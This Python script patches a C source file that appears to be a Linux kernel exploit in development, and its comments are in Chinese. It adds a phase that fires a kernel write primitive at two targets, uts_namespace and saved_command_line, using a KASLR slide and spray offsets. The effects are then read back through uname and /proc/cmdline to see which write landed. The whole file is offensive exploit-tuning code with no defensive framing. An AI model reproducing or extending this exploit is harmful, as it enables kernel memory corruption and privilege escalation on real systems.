# -*- coding: utf-8 -*-
"""pr.c: 加"判别相" —— 同一发里让 .data 和 .bss 两个落点各挨一笔, 一次开机就分清哪边不通。"""
import io

p = 'pr.c'
s = io.open(p, encoding='utf-8').read()

old = """    if (ph >= 1 && ph <= NSP) {
      C = (ph == 1 && C1UTS) ? (LK_UTS + SLIDE + 0x10) : (LK_SAVED_CMDLINE + SLIDE);
      P = (uintptr_t)((long)S + SP_LIST[ph - 1]);
    } else if (ph == NSP + 1) {"""
new = """    /* 相映射(9/27 真机定下来的):
     *   相1 = (C1UTS) C=uts+0x10, P=S+SP_LIST[0]   ⇒ 已验证: 2 发就落地, 形状/带内 lock 都对
     *   相2 = **判别相**: C=saved_command_line(.bss), P=uts+0x10(.data)
     *         这一发会同时留下两笔可观察写: *(uts+0x18)=C(uname 看得见) 和
     *         *(saved_command_line)=uts+0x10(`cat /proc/cmdline` 的长度会从 192 变成 1)
     *         ⇒ 哪一边动了就知道是"落点不可写"还是"链走没走到"。
     *   相3.. = 真正的读扫描: C=saved_command_line, P=S+SP_LIST[i] */
    if (ph == 1 && C1UTS) {
      C = LK_UTS + SLIDE + 0x10;
      P = (uintptr_t)((long)S + SP_LIST[0]);
    } else if (ph == 2) {
      C = LK_SAVED_CMDLINE + SLIDE;
      P = LK_UTS + SLIDE + 0x10;
    } else if (ph >= 3 && ph <= NSP + 2) {
      C = LK_SAVED_CMDLINE + SLIDE;
      P = (uintptr_t)((long)S + SP_LIST[ph - 3]);
    } else if (ph == NSP + 3) {"""
assert old in s
s = s.replace(old, new)

# 主循环判据: 相1/相2 用 sysname(相2 还顺手记 cmdline), 其余用 cmdline
old2 = """      if (phase == 1 && C1UTS) {
        read_sysname(cur, sizeof cur);"""
new2 = """      if ((phase == 1 && C1UTS) || phase == 2) {
        read_sysname(cur, sizeof cur);"""
assert old2 in s
s = s.replace(old2, new2)

old3 = """          say("[LAND] 相1(C=uts+0x10) 落地(第 %ld 发) ⇒ P=S%+lx 没问题, 是 .bss 那个 C 不行\\n",
              tries, (long)SP_LIST[0]);
          say("      %s\\n", cur);"""
new3 = """          ssize_t dl = read_cmdline(nb, sizeof nb);
          hexbuf(nbh, sizeof nbh, nb, dl);
          say("[LAND] 相%d 落地(第 %ld 发): sysname=\\n%s\\n     同时 cmdline len=%zd = %s\\n",
              phase, tries, cur, dl, dl > 0 ? nbh : "(读不到)");
          say("     ⇒ .data 那笔 %s, .bss 那笔 %s\\n", cur[24] != p0name[24] ? "动了" : "没动",
              (dl != cl) ? "动了(cmdline 长度变了)" : "没动");"""
assert old3 in s
s = s.replace(old3, new3)
io.open(p, 'w', encoding='utf-8').write(s)
print('ok')
